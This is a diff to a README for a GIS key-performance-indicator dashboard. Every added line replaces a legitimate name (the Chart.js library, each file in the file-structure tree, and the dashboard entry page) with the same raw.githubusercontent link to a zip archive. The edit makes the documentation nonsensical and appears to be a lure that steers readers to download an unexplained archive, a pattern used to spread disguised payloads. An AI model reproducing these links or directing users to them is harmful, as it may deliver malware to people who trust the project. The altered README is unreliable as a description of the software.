@@ -37,7 +37,7 @@ A comprehensive **GIS Key Performance Indicator Dashboard** designed for Ikeja E
 - **Real-time Progress Tracking** with visual progress bars
 
 ### 📊 **Interactive Charts & Analytics**
-- Chart.js integration for data visualization
+- https://raw.githubusercontent.com/Collins76/gis-kpi-dashboard/Data-Science-Project/mammaliferous/gis-kpi-dashboard.zip integration for data visualization
 - Doughnut, line, bar, and polar area charts
 - Performance gauges with animated counters
 - Role distribution analytics
@@ -188,7 +188,7 @@ A comprehensive **GIS Key Performance Indicator Dashboard** designed for Ikeja E
 - **Tailwind CSS** for responsive styling
 - **Custom CSS** for glow effects and animations
 - **Vanilla JavaScript** for interactivity
-- **Chart.js** for data visualization
+- **https://raw.githubusercontent.com/Collins76/gis-kpi-dashboard/Data-Science-Project/mammaliferous/gis-kpi-dashboard.zip** for data visualization
 - **Font Awesome** for icons
 
 ### **Data Management**
@@ -199,17 +199,17 @@ A comprehensive **GIS Key Performance Indicator Dashboard** designed for Ikeja E
 
 ### **File Structure**
 ```
-├── index.html              # Login page with black dropdowns
-├── dashboard.html          # Main dashboard interface
+├── https://raw.githubusercontent.com/Collins76/gis-kpi-dashboard/Data-Science-Project/mammaliferous/gis-kpi-dashboard.zip              # Login page with black dropdowns
+├── https://raw.githubusercontent.com/Collins76/gis-kpi-dashboard/Data-Science-Project/mammaliferous/gis-kpi-dashboard.zip          # Main dashboard interface
 ├── css/
-│   └── styles.css         # Custom glow theme styles
+│   └── https://raw.githubusercontent.com/Collins76/gis-kpi-dashboard/Data-Science-Project/mammaliferous/gis-kpi-dashboard.zip         # Custom glow theme styles
 ├── js/
-│   ├── dashboard.js       # Core dashboard functionality with 28 KPIs
-│   ├── charts.js          # Chart implementations
-│   ├── weather.js         # Weather integration
-│   ├── map.js            # Enhanced location management
-│   └── upload.js         # File upload system
-└── README.md             # Project documentation
+│   ├── https://raw.githubusercontent.com/Collins76/gis-kpi-dashboard/Data-Science-Project/mammaliferous/gis-kpi-dashboard.zip       # Core dashboard functionality with 28 KPIs
+│   ├── https://raw.githubusercontent.com/Collins76/gis-kpi-dashboard/Data-Science-Project/mammaliferous/gis-kpi-dashboard.zip          # Chart implementations
+│   ├── https://raw.githubusercontent.com/Collins76/gis-kpi-dashboard/Data-Science-Project/mammaliferous/gis-kpi-dashboard.zip         # Weather integration
+│   ├── https://raw.githubusercontent.com/Collins76/gis-kpi-dashboard/Data-Science-Project/mammaliferous/gis-kpi-dashboard.zip            # Enhanced location management
+│   └── https://raw.githubusercontent.com/Collins76/gis-kpi-dashboard/Data-Science-Project/mammaliferous/gis-kpi-dashboard.zip         # File upload system
+└── https://raw.githubusercontent.com/Collins76/gis-kpi-dashboard/Data-Science-Project/mammaliferous/gis-kpi-dashboard.zip             # Project documentation
 ```
 
 ## 🔧 **Configuration**
@@ -231,7 +231,7 @@ A comprehensive **GIS Key Performance Indicator Dashboard** designed for Ikeja E
 
 ## 🚀 **Deployment & Usage**
 
-1. **Access the dashboard** through `dashboard.html`
+1. **Access the dashboard** through `https://raw.githubusercontent.com/Collins76/gis-kpi-dashboard/Data-Science-Project/mammaliferous/gis-kpi-dashboard.zip`
 2. **Login** using the enhanced interface with black dropdowns
 3. **Navigate tabs** to explore different functionality:
    - **Overview**: Dashboard summary and metrics
